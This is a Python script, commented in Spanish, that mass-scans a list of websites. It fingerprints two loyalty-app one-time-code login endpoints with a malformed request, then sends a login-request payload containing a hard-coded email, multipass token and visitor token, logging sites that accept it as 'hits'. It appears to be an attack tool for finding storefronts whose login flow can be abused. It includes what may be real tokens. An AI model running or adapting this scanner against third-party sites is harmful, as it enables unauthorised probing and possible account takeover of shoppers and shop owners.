import requests
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# ============================
# CONFIGURACIÓN
# ============================

SITIOS_FILE = "sitios.txt"
HITS_FILE = "sitiosexito.txt"
FAILS_FILE = "fail.txt"
MAX_WORKERS = 15  # número de hilos

# Palomitas y colores
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

lock = threading.Lock()
progress = {
    "total": 0,
    "processed": 0
}

# ============================
# UTILIDADES
# ============================

def cargar_lista_sitios():
    """
    Lee sitios.txt y devuelve una lista de strings (dominios/URLs) sin líneas vacías.
    """
    p = Path(SITIOS_FILE)
    if not p.exists():
        print(f"{RED}[!] No se encontró {SITIOS_FILE}{RESET}")
        exit(1)

    sitios = []
    with p.open("r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if line.startswith("#"):
                continue
            sitios.append(line)
    return sitios


def cargar_procesados():
    """
    Carga los sitios ya procesados de sitiosexito.txt y fail.txt
    para poder reanudar sin repetir.
    """
    procesados = set()

    for file_path in [HITS_FILE, FAILS_FILE]:
        p = Path(file_path)
        if p.exists():
            with p.open("r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        procesados.add(line)

    return procesados


def normalizar_sitio(line):
    """
    Recibe una línea (dominio o URL) y devuelve:
    base_url (https://dominio)
    """
    line = line.strip()
    if line.startswith("http://") or line.startswith("https://"):
        base = line.rstrip("/")
    else:
        base = "https://" + line.rstrip("/")
    return base


def hacer_headers(base_url):
    """
    Crea los headers adecuados para cada dominio.
    """
    return {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0",
        "Accept": "application/json",
        "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": base_url + "/",
        "Content-Type": "application/json",
        "Origin": base_url,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Te": "trailers",
    }


def guardar_resultado(file_path, sitio):
    """
    Escribe el sitio en el archivo correspondiente, en modo append, de forma segura con lock.
    """
    with lock:
        p = Path(file_path)
        with p.open("a", encoding="utf-8") as f:
            f.write(sitio + "\n")


def actualizar_progreso():
    """
    Incrementa el contador de progreso y lo muestra.
    """
    with lock:
        progress["processed"] += 1
        print(f"{YELLOW}[{progress['processed']}/{progress['total']}] procesado...{RESET}", end="\r")


# ============================
# LÓGICA PRINCIPAL POR SITIO
# ============================

def procesar_sitio(sitio):
    """
    Procesa un solo sitio:
      - Prueba dos endpoints en la primera petición:
          /a/rivo/otc/login_request
          /apps/ba-loy/otc/login_request
      - En cada endpoint:
          1) Primer POST con salto de línea, esperar 400 + JSON {"status":400,"error":"Bad Request"}
          2) Si pasa, segundo POST con JSON real
      - Si al menos un endpoint tiene éxito en el segundo POST (2xx) => HIT
      - Si ninguno lo logra => FAIL
    """
    base_url = normalizar_sitio(sitio)
    headers = hacer_headers(base_url)

    # Endpoints que vamos a testear
    endpoints = [
        "/a/rivo/otc/login_request",
        "/apps/ba-loy/otc/login_request",
    ]

    session = requests.Session()
    session.headers.update(headers)

    # Payload para la segunda petición
    payload = {
        "otc_login": {
            "email": "desarrolloswebgto@gmail.com",
            "accepts_marketing": False,
            "loyalty_accepts_marketing": False,
            "multipass_request_token": "53hnan2i65ghulfx9qwriddpe1xwjwrk",
            "visitor_token": "dfb60deb4a544b599efb0cdd1db099d21767792540058"
        }
    }

    hubo_hit = False
    detalles_hit = []

    try:
        for path in endpoints:
            url = base_url + path

            # 1) PRIMERA PETICIÓN: BODY = "\n"
            try:
                resp1 = session.post(url, data="\n".encode(), timeout=15)
            except requests.RequestException as e:
                with lock:
                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (error de conexión en primera petición: {e})")
                continue

            is_first_ok = False
            if resp1.status_code == 400:
                try:
                    j = resp1.json()
                    if j.get("status") == 400 and j.get("error") == "Bad Request":
                        is_first_ok = True
                except ValueError:
                    is_first_ok = False

            if not is_first_ok:
                # Esta combinación sitio+endpoint no cumple la condición de la primera petición
                with lock:
                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (primera petición no devolvió el JSON esperado)")
                continue

            # 2) SEGUNDA PETICIÓN: BODY JSON REAL (solo si pasó la primera)
            try:
                resp2 = session.post(url, json=payload, timeout=20)
            except requests.RequestException as e:
                with lock:
                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (error de conexión en segunda petición: {e})")
                continue

            if 200 <= resp2.status_code < 300:
                hubo_hit = True
                detalles_hit.append(f"{path} (status {resp2.status_code})")
                with lock:
                    print(f"\n{GREEN}✔ HIT{RESET} {sitio} [{path}] (status: {resp2.status_code})")
            else:
                with lock:
                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (status segunda petición: {resp2.status_code})")

        # Después de probar ambos endpoints, decidimos si el sitio es HIT o FAIL
        if hubo_hit:
            guardar_resultado(HITS_FILE, sitio)
        else:
            guardar_resultado(FAILS_FILE, sitio)

    except Exception as e:
        with lock:
            print(f"\n{RED}✘ FAIL{RESET} {sitio} (error inesperado: {e})")
        guardar_resultado(FAILS_FILE, sitio)

    finally:
        actualizar_progreso()


# ============================
# MAIN
# ============================

def main():
    sitios = cargar_lista_sitios()
    procesados = cargar_procesados()

    # Filtrar sitios ya procesados
    sitios_pendientes = [s for s in sitios if s not in procesados]

    if not sitios_pendientes:
        print(f"{GREEN}[+] No hay sitios pendientes, ya está todo procesado.{RESET}")
        return

    progress["total"] = len(sitios_pendientes)
    progress["processed"] = 0

    print(f"{YELLOW}[i] Sitios totales en {SITIOS_FILE}: {len(sitios)}{RESET}")
    print(f"{YELLOW}[i] Sitios ya procesados (HIT/FAIL): {len(procesados)}{RESET}")
    print(f"{YELLOW}[i] Sitios pendientes: {progress['total']}{RESET}")
    print(f"{YELLOW}[i] Usando {MAX_WORKERS} hilos...{RESET}\n")

    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(procesar_sitio, sitio) for sitio in sitios_pendientes]

            for _ in as_completed(futures):
                pass

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrumpido por el usuario (Ctrl+C).{RESET}")
        print(f"{YELLOW}[i] El progreso está guardado en {HITS_FILE} y {FAILS_FILE}. "
              f"Al volver a ejecutar reanudará donde se quedó.{RESET}")

    print(f"\n{GREEN}[✓] Finalizado. Procesados {progress['processed']} sitios pendientes.{RESET}")


if __name__ == "__main__":
    main()
